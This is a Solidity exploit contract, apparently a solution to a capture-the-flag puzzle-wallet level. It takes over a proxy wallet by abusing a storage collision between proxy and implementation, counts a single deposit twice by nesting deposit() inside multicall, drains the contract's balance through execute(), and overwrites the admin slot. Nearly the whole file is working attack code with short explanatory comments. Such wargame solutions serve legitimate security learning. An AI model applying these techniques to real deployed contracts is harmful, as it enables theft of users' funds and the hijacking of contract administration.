// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ITarget {
    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function multicall(bytes[] calldata data) external payable;

    function setMaxBalance(uint256 _maxBalance) external;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;
}

contract ExploitPuzzleWallet is Ownable {
    ITarget target;

    constructor(address _target) {
        target = ITarget(_target);
    }

    function execute() external {
        // Exploit storage collision of proxy w/ implementation
        // Actually sets owner
        target.proposeNewAdmin(address(this));

        // Can whitelist oneself
        target.addToWhitelist(address(this));

        // # Empty contract balance
        // A deposit() sets balance, call with delegate and it sets it's own balance
        //    - direct call will not work
        // B can execute() with value 0 to call anything
        //    - drain funds via .call{value: }
        // C multicall() includes delegateCall to itself
        //    - delegatecall to call itself

        bytes[] memory data = new bytes[](3);
        bytes[] memory nestedData = new bytes[](1);

        nestedData[0] = abi.encodeWithSignature("deposit()");

        uint256 attackAmount = address(target).balance;

        data[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", nestedData);
        data[2] = abi.encodeWithSignature(
            "execute(address,uint256,bytes)",
            address(this),
            attackAmount * 2, //because double deposit call
            new bytes[](0)
        );

        target.multicall{value: attackAmount}(data);
        target.setMaxBalance(uint256(uint160(bytes20(owner()))));
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {}
}
